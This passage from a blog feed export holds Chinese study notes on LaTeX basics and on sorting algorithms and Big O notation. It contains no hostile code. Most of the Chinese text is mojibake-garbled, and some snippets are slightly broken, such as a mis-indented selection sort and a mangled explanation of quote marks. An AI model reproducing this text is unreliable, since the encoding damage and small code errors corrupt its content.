href="#2-3-TeX-Live-æœ¬åœ°å®åŒ…ç®¡ç†" class="headerlink" title="2.3 TeX Live æœ¬åœ°å®åŒ…ç®¡ç†"></a>2.3 TeX Live æœ¬åœ°å®åŒ…ç®¡ç†</h2><p>ä½¿ç”¨ TeX Live manager, ä½¿ç”¨<code>tlmgr</code>å‘½ä»¤.</p><h2 id="2-6-ç¼–è¯‘æ–‡æ¡£"><a href="#2-6-ç¼–è¯‘æ–‡æ¡£" class="headerlink" title="2.6 ç¼–è¯‘æ–‡æ¡£"></a>2.6 ç¼–è¯‘æ–‡æ¡£</h2><h3 id="2-6-2-é”™è¯¯çš„æ’æŸ¥"><a href="#2-6-2-é”™è¯¯çš„æ’æŸ¥" class="headerlink" title="2.6.2 é”™è¯¯çš„æ’æŸ¥"></a>2.6.2 é”™è¯¯çš„æ’æŸ¥</h3><p>å¯ä»¥ç¿»é˜…æ–‡ä»¶å¤¹ä¸­çš„æ—¥å¿—è®°å½•(log æ–‡ä»¶), æ¥æ‰¾åˆ° Warnings å¼€å¤´çš„è®°å½•, æˆ–è€… Overfull&#x2F;Underfull å¼€å¤´çš„è®°å½•.</p><ul><li>ç”±äº LaTeX çš„ç¼–è¯‘åŸç†(ç¬¬ä¸€æ¬¡ç”Ÿæˆ aux æ–‡ä»¶, ç¬¬äºŒæ¬¡å†å¼•ç”¨å®ƒ), ç›®å½•æƒ³è¦åˆç†æ˜¾ç¤º, éœ€è¦è¿ç»­ç¼–è¯‘ä¸¤æ¬¡.</li></ul><p>ä¸€ä¸ªç”¨äºæ’æŸ¥è¯­æ³•é”™è¯¯çš„å®åŒ…: syntonly. åŠ è½½æ­¤å®åŒ…å, å¯ä»¥åœ¨å¯¼è¨€åŒºåŠ å…¥<code>\syntaxonly</code>å‘½ä»¤, LaTeX ä¼šåªæ’æŸ¥è¯­æ³•è€Œä¸ç”Ÿæˆä»»ä½•æ–‡æ¡£.</p><h3 id="2-6-3-TeXå¸®åŠ©èµ„æº"><a href="#2-6-3-TeXå¸®åŠ©èµ„æº" class="headerlink" title="2.6.3 TeXå¸®åŠ©èµ„æº"></a>2.6.3 TeXå¸®åŠ©èµ„æº</h3><p>ä½¿ç”¨ <code>texdoc</code> å‘½ä»¤:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>texdoc ctex<br></code></pre></td></tr></table></figure><h3 id="2-6-4-TeX-ä½¿ç”¨å·¥å…·"><a href="#2-6-4-TeX-ä½¿ç”¨å·¥å…·" class="headerlink" title="2.6.4 TeX ä½¿ç”¨å·¥å…·"></a>2.6.4 TeX ä½¿ç”¨å·¥å…·</h3><ul><li>æ‰‹å†™ç¬¦å·è¯†åˆ«, <a href="http://detexify.kirelabs.org/classify.html">Detexify</a>.</li><li>å…¬å¼æˆªå›¾è¯†åˆ«, <a href="https://mathpix.com/">Snip</a></li></ul><h1 id="ç¬¬3ç« -LaTeX-åŸºç¡€"><a href="#ç¬¬3ç« -LaTeX-åŸºç¡€" class="headerlink" title="ç¬¬3ç«  LaTeX åŸºç¡€"></a>ç¬¬3ç«  LaTeX åŸºç¡€</h1><h2 id="è®¤è¯†-LaTeX"><a href="#è®¤è¯†-LaTeX" class="headerlink" title="è®¤è¯† LaTeX"></a>è®¤è¯† LaTeX</h2><h3 id="3-1-1-å‘½ä»¤ä¸ç¯å¢ƒ"><a href="#3-1-1-å‘½ä»¤ä¸ç¯å¢ƒ" class="headerlink" title="3.1.1 å‘½ä»¤ä¸ç¯å¢ƒ"></a>3.1.1 å‘½ä»¤ä¸ç¯å¢ƒ</h3><p>LaTeX ä¸­çš„å‘½ä»¤é€šå¸¸æ˜¯ç”±ä¸€ä¸ªåæ–œæ åŠ å‘½ä»¤åç§°, å†åŠ ä¸ŠèŠ±æ‹¬å·å†…çš„å‚æ•°æ„æˆçš„.</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">\documentclass</span><span class="hljs-template-variable">&#123;ctexart&#125;</span><br></code></pre></td></tr></table></figure><p>å¦‚æœä¸€äº›é€‰é¡¹æ˜¯å¤‡é€‰çš„, é‚£ä¹ˆé€šå¸¸ä¼šåœ¨èŠ±æ‹¬å·å‰ç”¨æ–¹æ‹¬å·æ ‡å‡º:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">\documentclass<span class="hljs-selector-attr">[a4paper]</span>&#123;ctexart&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„: ä¸å¸¦å‚æ•°çš„å‘½ä»¤åé¢å¦‚æœæƒ³æ‰“å°ç©ºæ ¼, è¯·åœ¨ä¸€å¯¹å†…éƒ¨ä¸ºç©ºçš„è¯æ‹¬å·åé”®å…¥ç©ºæ ¼, å¦åˆ™ç©ºæ ¼ä¼šè¢«å¿½ç•¥.</p><h3 id="3-1-2-ä¿ç•™å­—ç¬¦"><a href="#3-1-2-ä¿ç•™å­—ç¬¦" class="headerlink" title="3.1.2 ä¿ç•™å­—ç¬¦"></a>3.1.2 ä¿ç•™å­—ç¬¦</h3><p>åœ¨LaTeXä¸­æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦:</p><ul><li><h1 id="ï¼šè‡ªå®šä¹‰å‘½ä»¤æ—¶ï¼Œç”¨äºæ ‡æ˜å‚æ•°åºå·ã€‚"><a href="#ï¼šè‡ªå®šä¹‰å‘½ä»¤æ—¶ï¼Œç”¨äºæ ‡æ˜å‚æ•°åºå·ã€‚" class="headerlink" title="ï¼šè‡ªå®šä¹‰å‘½ä»¤æ—¶ï¼Œç”¨äºæ ‡æ˜å‚æ•°åºå·ã€‚"></a>ï¼šè‡ªå®šä¹‰å‘½ä»¤æ—¶ï¼Œç”¨äºæ ‡æ˜å‚æ•°åºå·ã€‚</h1></li><li>$ ï¼šæ•°å­¦ç¯å¢ƒå‘½ä»¤ç¬¦ã€‚</li><li>% ï¼šæ³¨é‡Šç¬¦ï¼Œå…¶åçš„è¯¥è¡Œå‘½ä»¤éƒ½ä¼šè§†ä¸ºæ³¨é‡Šã€‚å¦‚æœåœ¨è¡Œæœ«æ·»åŠ è¿™</li><li>ä¸ªå‘½ä»¤ï¼Œå¯ä»¥é˜²æ­¢ LaTeX åœ¨è¡Œæœ«æ’å…¥ä¸€äº›å¥‡æ€ªçš„ç©ºç™½ç¬¦ã€‚</li><li>^ ï¼šæ•°å­¦ç¯å¢ƒä¸­çš„ä¸Šæ ‡å‘½ä»¤ç¬¦ã€‚</li><li>&amp; ï¼šè¡¨æ ¼ç¯å¢ƒä¸­çš„è·³åˆ—ç¬¦ã€‚</li><li>_ ï¼šæ•°å­¦ç¯å¢ƒä¸­çš„ä¸‹æ ‡å‘½ä»¤ç¬¦ã€‚</li><li>{ ä¸ } ï¼šç”¨äºæ ‡è®°å‘½ä»¤çš„å¿…é€‰å‚æ•°ï¼Œæˆ–è€…æ ‡è®°æŸä¸€éƒ¨åˆ†å‘½ä»¤ä½¿</li><li>å…¶æˆä¸ºä¸€ä¸ªæ•´ä½“ã€‚</li><li>\ ï¼šç”¨äºå¼€å§‹ LaTeX å‘½ä»¤ã€‚</li></ul><p>å¯ç”¨<code>\</code>æ¥è½¬ä¹‰è¾“å‡º.</p><p>è¾“å‡º<code>\</code>å¯ç”¨<code>\texttt</code>:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\texttt&#123;char92&#125;</span> <span class="hljs-comment">#\texttt&#123;char[92]&#125;</span><br><span class="hljs-keyword">or</span><br><span class="hljs-string">\texttt&#123;char`\\&#125;</span> <span class="hljs-comment">#éœ€è½¬ä¹‰çš„å­—ç¬¦éœ€æ·»åŠ åæ–œçº¿</span><br></code></pre></td></tr></table></figure><h3 id="3-1-3-å¯¼è¨€åŒº"><a href="#3-1-3-å¯¼è¨€åŒº" class="headerlink" title="3.1.3 å¯¼è¨€åŒº"></a>3.1.3 å¯¼è¨€åŒº</h3><p>ä»»ä½•ä¸€ä¸ªLaTeXæ–‡æ¡£éƒ½åº”è¯¥æœ‰çš„ç»“æ„:</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xquery">\documentclass[options]<span class="hljs-built_in">&#123;doc</span>-class&#125;<br>\begin<span class="hljs-built_in">&#123;document</span>&#125;<br>  ...<br>\<span class="hljs-keyword">end</span><span class="hljs-built_in">&#123;document</span>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥æŠŠå¯¼è¨€åŒºè§†ä¸ºæ¨¡æ¿çš„å®šä¹‰.</p><p>åœ¨å¯¼è¨€åŒºæœ€å¸¸è§çš„æ˜¯å®åŒ…çš„åŠ è½½å·¥ä½œ:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">\usepackage&#123;<span class="hljs-keyword">package</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-1-4-æ–‡ä»¶è¾“å‡º"><a href="#3-1-4-æ–‡ä»¶è¾“å‡º" class="headerlink" title="3.1.4 æ–‡ä»¶è¾“å‡º"></a>3.1.4 æ–‡ä»¶è¾“å‡º</h3><h2 id="3-2-æ ‡ç‚¹ä¸å¼ºè°ƒ"><a href="#3-2-æ ‡ç‚¹ä¸å¼ºè°ƒ" class="headerlink" title="3.2 æ ‡ç‚¹ä¸å¼ºè°ƒ"></a>3.2 æ ‡ç‚¹ä¸å¼ºè°ƒ</h2><p>åœ¨æ–‡æœ¬ä¸­ä½¿ç”¨<code>$$</code>ä¹¦å†™æ•°å­¦ç¬¦å·.</p><p>å¦‚æœåœ¨ LaTeX ä¸­ç›´æ¥è¾“å…¥å¤§äºå·, å°äºå·è€Œä¸æŠŠå®ƒä»¬æ”¾åœ¨æ•°å­¦ç¯å¢ƒä¸­, å®ƒä»¬å¹¶ä¸ä¼šè¢«æ­£ç¡®åœ°æ‰“å°.</p><h3 id="3-2-1-å¼•å·"><a href="#3-2-1-å¼•å·" class="headerlink" title="3.2.1 å¼•å·"></a>3.2.1 å¼•å·</h3><p>è‹±æ–‡çš„å•å¼•å·ä¸æ˜¯ä¸¤ä¸ª<code>&#39;</code>, å·¦å¼•å·æ˜¯<code>\``, è€Œå³å¼•å·æ˜¯</code>â€˜&#96;.</p><h3 id="3-2-2-çŸ­æ¨ª-çœç•¥å·ä¸ç ´æŠ˜å·"><a href="#3-2-2-çŸ­æ¨ª-çœç•¥å·ä¸ç ´æŠ˜å·" class="headerlink" title="3.2.2 çŸ­æ¨ª, çœç•¥å·ä¸ç ´æŠ˜å·"></a>3.2.2 çŸ­æ¨ª, çœç•¥å·ä¸ç ´æŠ˜å·</h3><p>è‹±æ–‡çš„çœç•¥å·ä½¿ç”¨<code>\ldots</code>å‘½ä»¤, è€Œä¸æ˜¯ä¸‰ä¸ªå¥ç‚¹.</p><h3 id="3-2-3-å¼ºè°ƒ-ç²—ä¸æ–œ"><a href="#3-2-3-å¼ºè°ƒ-ç²—ä¸æ–œ" class="headerlink" title="3.2.3 å¼ºè°ƒ: ç²—ä¸æ–œ"></a>3.2.3 å¼ºè°ƒ: ç²—ä¸æ–œ</h3><p>ä½¿ç”¨ <code>\emph&#123;text&#125;</code> å‘½ä»¤.</p><p>å¦‚æœå¯¹ä¸€æ®µå·²ç»è¿™æ ·è½¬æ¢ä¸ºæ–œä½“çš„æ–‡æœ¬å†ä½¿ç”¨è¿™ä¸ªå‘½ä»¤, å®ƒå°±ä¼šå–æ¶ˆæ–œä½“.</p><h3 id="3-2-4-ä¸‹åˆ’çº¿ä¸åˆ é™¤çº¿"><a href="#3-2-4-ä¸‹åˆ’çº¿ä¸åˆ é™¤çº¿" class="headerlink" title="3.2.4 ä¸‹åˆ’çº¿ä¸åˆ é™¤çº¿"></a>3.2.4 ä¸‹åˆ’çº¿ä¸åˆ é™¤çº¿</h3><p>ä½¿ç”¨ <code>ulem</code> å®åŒ…çš„ <code>uline</code> å‘½ä»¤.</p><h2 id="3-3-æ ¼å¼æ§åˆ¶"><a href="#3-3-æ ¼å¼æ§åˆ¶" class="headerlink" title="3.3 æ ¼å¼æ§åˆ¶"></a>3.3 æ ¼å¼æ§åˆ¶</h2><h3 id="3-3-1-ç©ºæ ¼-æ¢è¡Œä¸åˆ†æ®µ"><a href="#3-3-1-ç©ºæ ¼-æ¢è¡Œä¸åˆ†æ®µ" class="headerlink" title="3.3.1 ç©ºæ ¼, æ¢è¡Œä¸åˆ†æ®µ"></a>3.3.1 ç©ºæ ¼, æ¢è¡Œä¸åˆ†æ®µ</h3><p>åœ¨ LaTeX ä¸­, å¤šä¸ªç©ºæ ¼ä¼šè¢«è§†ä¸ºä¸€ä¸ª, å¤šä¸ªæ¢è¡Œä¹Ÿä¼šè¢«è§†ä¸ºä¸€ä¸ª.</p><p>å®åŒ… <code>lettrine</code> èƒ½å¤Ÿç”Ÿæˆé¦–å­—ä¸‹æ²‰çš„æ•ˆæœ:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">\lettrine</span><span class="hljs-template-variable">&#123;T&#125;</span><span class="hljs-template-variable">&#123;his&#125;</span><br></code></pre></td></tr></table></figure><h2 id="3-4-å­—ä½“ä¸é¢œè‰²"><a href="#3-4-å­—ä½“ä¸é¢œè‰²" class="headerlink" title="3.4 å­—ä½“ä¸é¢œè‰²"></a>3.4 å­—ä½“ä¸é¢œè‰²</h2><p>å®‹ä½“, é»‘ä½“, æ¥·ä½“å±äºå­—æ—; åŠ ç²—, åŠ æ–œå±äºå­—ç³»å’Œå­—å½¢; äº”å·, å°å››å·å±äºå­—å·. è¿™ä¸‰è€…å¤§æ¦‚å¯ä»¥å¹¶ç§°ä¸ºå­—ä½“.</p><h2 id="3-5-å¼•ç”¨ä¸æ³¨é‡Š"><a href="#3-5-å¼•ç”¨ä¸æ³¨é‡Š" class="headerlink" title="3.5 å¼•ç”¨ä¸æ³¨é‡Š"></a>3.5 å¼•ç”¨ä¸æ³¨é‡Š</h2><h1 id="ç¬¬4ç« -æ•°å­¦æ’ç‰ˆ"><a href="#ç¬¬4ç« -æ•°å­¦æ’ç‰ˆ" class="headerlink" title="ç¬¬4ç«  æ•°å­¦æ’ç‰ˆ"></a>ç¬¬4ç«  æ•°å­¦æ’ç‰ˆ</h1><h1 id="ç¬¬5ç« -LaTeX-è¿›é˜¶"><a href="#ç¬¬5ç« -LaTeX-è¿›é˜¶" class="headerlink" title="ç¬¬5ç«  LaTeX è¿›é˜¶"></a>ç¬¬5ç«  LaTeX è¿›é˜¶</h1><h2 id="5-1-è‡ªå®šä¹‰å‘½ä»¤ä¸ç¯å¢ƒ"><a href="#5-1-è‡ªå®šä¹‰å‘½ä»¤ä¸ç¯å¢ƒ" class="headerlink" title="5.1 è‡ªå®šä¹‰å‘½ä»¤ä¸ç¯å¢ƒ"></a>5.1 è‡ªå®šä¹‰å‘½ä»¤ä¸ç¯å¢ƒ</h2><p>è‡ªå®šä¹‰å‘½ä»¤:</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">\<span class="hljs-keyword">new</span><span class="hljs-type">command</span>&#123;cmd&#125;[args][<span class="hljs-keyword">default</span>]&#123;def&#125;<br></code></pre></td></tr></table></figure><ul><li>cmd ï¼šæ–°å®šä¹‰çš„å‘½ä»¤ï¼Œä¸èƒ½ä¸ç°æœ‰å‘½ä»¤é‡åã€‚</li><li>args ï¼šå‚æ•°ä¸ªæ•°ã€‚</li><li>default ï¼šé¦–ä¸ªå‚æ•°ï¼Œå³ #1 çš„é»˜è®¤å€¼ã€‚ä½ å¯ä»¥å®šä¹‰åªæœ‰ä¸€ä¸ª</li><li>å‚æ•°ä¸”å‚æ•°å«é»˜è®¤å€¼çš„å‘½ä»¤ã€‚</li><li>def ï¼šå®šä¹‰çš„å…·ä½“å†…å®¹ã€‚å‚æ•° 1 ä»¥ #1 ä»£æ›¿ï¼Œå‚æ•° 2 ä»¥ #2 ä»£æ›¿ï¼Œä»¥æ­¤ç±»æ¨ã€‚</li></ul>]]></content>
    
    
    <categories>
      
      <category>LaTeX</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Writing Greek Alphabet in LaTeX</title>
    <link href="/2022/08/04/Writing-Greek-Alphabet-in-LaTeX/"/>
    <url>/2022/08/04/Writing-Greek-Alphabet-in-LaTeX/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/zhouchen1998/article/details/119324338">reference</a></p><hr>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Fix the error:UnboundLocalError: local variable num_rolls referenced before assignment</title>
    <link href="/2022/08/03/Fix-the-error-UnboundLocalError-local-variable-num-rolls-referenced-before-assignment/"/>
    <url>/2022/08/03/Fix-the-error-UnboundLocalError-local-variable-num-rolls-referenced-before-assignment/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç®—æ³•å›¾è§£ Notes</title>
    <link href="/2022/08/03/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3-Notes/"/>
    <url>/2022/08/03/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€ç« "><a href="#ç¬¬ä¸€ç« " class="headerlink" title="ç¬¬ä¸€ç« "></a>ç¬¬ä¸€ç« </h1><h2 id="1-2-äºŒåˆ†æŸ¥æ‰¾"><a href="#1-2-äºŒåˆ†æŸ¥æ‰¾" class="headerlink" title="1.2 äºŒåˆ†æŸ¥æ‰¾"></a>1.2 äºŒåˆ†æŸ¥æ‰¾</h2><h3 id="1-2-2-è¿è¡Œæ—¶é—´"><a href="#1-2-2-è¿è¡Œæ—¶é—´" class="headerlink" title="1.2.2 è¿è¡Œæ—¶é—´"></a>1.2.2 è¿è¡Œæ—¶é—´</h3><p>å¦‚æœæœ€å¤šçŒœæµ‹çš„æ¬¡æ•°ä¸åˆ—è¡¨é•¿åº¦ç›¸åŒ,è¿™è¢«ç§°ä¸ºçº¿æ€§æ—¶é—´(linear time).</p><h2 id="1-3-å¤§Oè¡¨ç¤ºæ³•"><a href="#1-3-å¤§Oè¡¨ç¤ºæ³•" class="headerlink" title="1.3 å¤§Oè¡¨ç¤ºæ³•"></a>1.3 å¤§Oè¡¨ç¤ºæ³•</h2><p>å¤§Oè¡¨ç¤ºæ³•æŒ‡å‡ºäº†ç®—æ³•æœ‰å¤šå¿«.</p><p>ä½¿ç”¨å¤§Oè¡¨ç¤ºæ³•, è¿™ä¸ªè¿è¡Œæ—¶é—´ä¸ºO(n).</p><p>å¤§Oè¡¨ç¤ºæ³•æŒ‡çš„å¹¶éä»¥ç§’ä¸ºå•ä½çš„é€Ÿåº¦, å¤§Oè¡¨ç¤ºæ³•è®©ä½ èƒ½å¤Ÿæ¯”è¾ƒæ“ä½œæ•°,å®ƒæŒ‡å‡ºäº†ç®—æ³•è¿è¡Œæ—¶é—´çš„å¢é€Ÿ.</p><p>O(n), è¿™é‡Œçš„<code>n</code>ä¸ºæ“ä½œæ•°, ä¹‹æ‰€ä»¥ç§°ä¸ºå¤§Oè¡¨ç¤ºæ³•, æ˜¯å› ä¸ºæ“ä½œæ•°å‰æœ‰ä¸ªå¤§O.</p><h3 id="1-3-3-å¤§Oè¡¨ç¤ºæ³•æŒ‡å‡ºäº†æœ€ç³Ÿæƒ…å†µä¸‹çš„è¿è¡Œæ—¶é—´"><a href="#1-3-3-å¤§Oè¡¨ç¤ºæ³•æŒ‡å‡ºäº†æœ€ç³Ÿæƒ…å†µä¸‹çš„è¿è¡Œæ—¶é—´" class="headerlink" title="1.3.3 å¤§Oè¡¨ç¤ºæ³•æŒ‡å‡ºäº†æœ€ç³Ÿæƒ…å†µä¸‹çš„è¿è¡Œæ—¶é—´"></a>1.3.3 å¤§Oè¡¨ç¤ºæ³•æŒ‡å‡ºäº†æœ€ç³Ÿæƒ…å†µä¸‹çš„è¿è¡Œæ—¶é—´</h3><p>ç®€å•æŸ¥æ‰¾çš„è¿è¡Œæ—¶é—´ä¸ºO(n), äºŒåˆ†æŸ¥æ‰¾çš„è¿è¡Œæ—¶é—´ä¸º$\logn$.</p><h3 id="1-3-5-æ—…è¡Œå•†"><a href="#1-3-5-æ—…è¡Œå•†" class="headerlink" title="1.3.5 æ—…è¡Œå•†"></a>1.3.5 æ—…è¡Œå•†</h3><p>è®¡ç®—æœºç§‘å­¦é¢†åŸŸéå¸¸è‘—åçš„æ—…è¡Œå•†é—®é¢˜.</p><p>æ‰¾åˆ°æœ€çŸ­æ—…ç¨‹çš„æ–¹æ¡ˆ.</p><h1 id="ç¬¬2ç« -é€‰æ‹©æ’åº"><a href="#ç¬¬2ç« -é€‰æ‹©æ’åº" class="headerlink" title="ç¬¬2ç«  é€‰æ‹©æ’åº"></a>ç¬¬2ç«  é€‰æ‹©æ’åº</h1><h2 id="2-2-æ•°ç»„å’Œé“¾è¡¨"><a href="#2-2-æ•°ç»„å’Œé“¾è¡¨" class="headerlink" title="2.2 æ•°ç»„å’Œé“¾è¡¨"></a>2.2 æ•°ç»„å’Œé“¾è¡¨</h2><p>O(n) æ˜¯çº¿æ€§æ—¶é—´.</p><p>O(1) æ˜¯å¸¸é‡æ—¶é—´.</p><p>æ•°ç»„åœ¨éšæœºè¯»å–ä¸Šæ›´å¿«.</p><p>é“¾è¡¨åœ¨æ’å…¥ä¸Šæ›´å¿«.</p><h3 id="2-2-4-åœ¨ä¸­é—´æ’å…¥"><a href="#2-2-4-åœ¨ä¸­é—´æ’å…¥" class="headerlink" title="2.2.4 åœ¨ä¸­é—´æ’å…¥"></a>2.2.4 åœ¨ä¸­é—´æ’å…¥</h3><h3 id="2-2-5-åˆ é™¤"><a href="#2-2-5-åˆ é™¤" class="headerlink" title="2.2.5 åˆ é™¤"></a>2.2.5 åˆ é™¤</h3><h2 id="2-3-é€‰æ‹©æ’åº"><a href="#2-3-é€‰æ‹©æ’åº" class="headerlink" title="2.3 é€‰æ‹©æ’åº"></a>2.3 é€‰æ‹©æ’åº</h2><p>ä¸€èˆ¬ O($\frac{n^2}{2}$) å†™ä¸º O($n^2$), è¿™ä¸ª$\frac{1}{2}$ä¸€èˆ¬ä¼šçœç•¥. </p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">selectionSort</span>(arr):<br>  newArr = []<br>  for i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(arr)):<br>      smallest = <span class="hljs-built_in">findSmallest</span>(arr)<br>      newArr.<span class="hljs-built_in">append</span>(arr.<span class="hljs-built_in">pop</span>(smallest))<br>return newArr<br></code></pre></td></tr></table></figure><p> çœ‹æ¥<code>pop</code>å¯ä»¥å¼¹å‡ºä»»æ„çš„å…ƒç´ .</p><h1 id="ç¬¬3ç« -é€’å½’"><a href="#ç¬¬3ç« -é€’å½’" class="headerlink" title="ç¬¬3ç«  é€’å½’"></a>ç¬¬3ç«  é€’å½’</h1><p>å¦‚æœä½¿ç”¨å¾ªç¯, ç¨‹åºçš„æ€§èƒ½å¯èƒ½æ›´é«˜; å¦‚æœä½¿ç”¨é€’å½’, ç¨‹åºå¯èƒ½æ›´å®¹æ˜“ç†è§£.</p><h2 id="3-2-åŸºçº¿æ¡ä»¶å’Œé€’å½’æ¡ä»¶"><a href="#3-2-åŸºçº¿æ¡ä»¶å’Œé€’å½’æ¡ä»¶" class="headerlink" title="3.2 åŸºçº¿æ¡ä»¶å’Œé€’å½’æ¡ä»¶"></a>3.2 åŸºçº¿æ¡ä»¶å’Œé€’å½’æ¡ä»¶</h2><p>ç¼–å†™é€’å½’å‡½æ•°, å¿…é¡»å‘Šè¯‰å®ƒä½•æ—¶åœæ­¢é€’å½’. å› æ­¤, æ¯ä¸ªé€’å½’å‡½æ•°éƒ½æœ‰ä¸¤éƒ¨åˆ†:</p><ul><li>base case, åŸºçº¿æ¡ä»¶, æŒ‡å‡½æ•°ä¸å†è°ƒç”¨è‡ªå·±</li><li>recursive case, é€’å½’æ¡ä»¶, æŒ‡å‡½æ•°è°ƒç”¨è‡ªå·±</li></ul><h2 id="3-3-æ ˆ"><a href="#3-3-æ ˆ" class="headerlink" title="3.3 æ ˆ"></a>3.3 æ ˆ</h2><p>ä¸€ä¸ªé‡è¦çš„ç¼–ç¨‹æ¦‚å¿µâ€“call stack, è°ƒç”¨æ ˆ. å…¶åªæœ‰ä¸¤ä¸ªæ“ä½œ, push, å‹å…¥å’Œpop, å¼¹å‡º.</p><p>è®¡ç®—æœºä½¿ç”¨ä¸€ä¸ªæ ˆæ¥è¡¨ç¤ºè¿™äº›å†…å­˜å—.</p><p>ä¸€ä¸ªé‡è¦æ¦‚å¿µ: è°ƒç”¨å¦ä¸€ä¸ªå‡½æ•°æ—¶, å½“å‰å‡½æ•°æš‚åœå¹¶å¤„äºæœªå®ŒæˆçŠ¶æ€, è¯¥å‡½æ•°çš„æ‰€æœ‰å˜é‡çš„å€¼éƒ½è¿˜åœ¨å†…å­˜ä¸­.</p><h3 id="3-3-2-é€’å½’è°ƒç”¨æ ˆ"><a href="#3-3-2-é€’å½’è°ƒç”¨æ ˆ" class="headerlink" title="3.3.2 é€’å½’è°ƒç”¨æ ˆ"></a>3.3.2 é€’å½’è°ƒç”¨æ ˆ</h3><p>æ ˆåœ¨é€’å½’ä¸­æ‰®æ¼”ç€é‡è¦è§’è‰².</p><h1 id="ç¬¬4ç« -å¿«é€Ÿæ’åº"><a href="#ç¬¬4ç« -å¿«é€Ÿæ’åº" class="headerlink" title="ç¬¬4ç«  å¿«é€Ÿæ’åº"></a>ç¬¬4ç«  å¿«é€Ÿæ’åº</h1><p>Divide and Conquer, D&amp;C, ä¸€ç§é€’å½’å¼é—®é¢˜è§£å†³æ–¹æ³•.</p><p>D&amp;C çš„å·¥ä½œåŸç†:</p><ol><li>æ‰¾å‡ºç®€å•çš„åŸºçº¿æ¡ä»¶</li><li>ç¡®å®šå¦‚ä½•ç¼©å°é—®é¢˜çš„è§„æ¨¡, ä½¿å…¶ç¬¦åˆåŸºçº¿æ¡ä»¶<br>D&amp;C å¹¶éå¯ç”¨äºè§£å†³é—®é¢˜çš„ç®—æ³•, è€Œæ˜¯ä¸€ç§è§£å†³é—®é¢˜çš„æ€è·¯.</li></ol><p>ç¼–å†™<mark>æ¶‰åŠæ•°ç»„</mark>çš„é€’å½’å‡½æ•°æ—¶, åŸºçº¿æ¡ä»¶é€šå¸¸æ˜¯æ•°ç»„ä¸ºç©ºæˆ–åªåŒ…å«ä¸€ä¸ªå…ƒç´ .</p><p>åœ¨å¾ˆå¤šç”¨å¾ªç¯è§£å†³çš„æ–¹æ¡ˆä¸­, å¯ä»¥è€ƒè™‘ä½¿ç”¨é€’å½’.</p><h2 id="4-2-å¿«é€Ÿæ’åº"><a href="#4-2-å¿«é€Ÿæ’åº" class="headerlink" title="4.2 å¿«é€Ÿæ’åº"></a>4.2 å¿«é€Ÿæ’åº</h2><p>å·¥ä½œåŸç†:</p><ol><li>ä»æ•°ç»„ä¸­é€‰æ‹©ä¸€ä¸ªå…ƒç´ , è¿™ä¸ªå…ƒç´ è¢«ç§°ä¸ºåŸºå‡†å€¼(pivot).</li><li>æ‰¾å‡ºæ¯”åŸºå‡†å€¼å°çš„å…ƒç´ ä»¥åŠæ¯”åŸºå‡†å€¼å¤§çš„å…ƒç´ . è¿™è¢«ç§°ä¸ºåˆ†åŒº(partitioning).</li><li>å¯¹è¿™ä¸¤ä¸ªå­æ•°ç»„è¿›è¡Œå¿«é€Ÿæ’åº.<br>ä»»ä½•å…ƒç´ ç”¨ä½œåŸºå‡†å€¼éƒ½å¯è¡Œ.</li></ol><p><mark>å½’çº³è¯æ˜</mark>, ä¸€ç§è¯æ˜ç®—æ³•è¡Œä¹‹æœ‰æ•ˆçš„æ–¹å¼, åˆ†ä¸ºä¸¤æ­¥: åŸºçº¿æ¡ä»¶å’Œå½’çº³æ¡ä»¶.</p><h2 id="4-3-å†è°ˆå¤§Oè¡¨ç¤ºæ³•"><a href="#4-3-å†è°ˆå¤§Oè¡¨ç¤ºæ³•" class="headerlink" title="4.3 å†è°ˆå¤§Oè¡¨ç¤ºæ³•"></a>4.3 å†è°ˆå¤§Oè¡¨ç¤ºæ³•</h2><p>å¿«é€Ÿæ’åºçš„ç‹¬ç‰¹ä¹‹å¤„åœ¨äº,å…¶é€Ÿåº¦å–å†³äºé€‰æ‹©çš„åŸºå‡†å€¼.</p><h3 id="4-3-1-æ¯”è¾ƒåˆå¹¶æ’åºå’Œå¿«é€Ÿæ’åº"><a href="#4-3-1-æ¯”è¾ƒåˆå¹¶æ’åºå’Œå¿«é€Ÿæ’åº" class="headerlink" title="4.3.1 æ¯”è¾ƒåˆå¹¶æ’åºå’Œå¿«é€Ÿæ’åº"></a>4.3.1 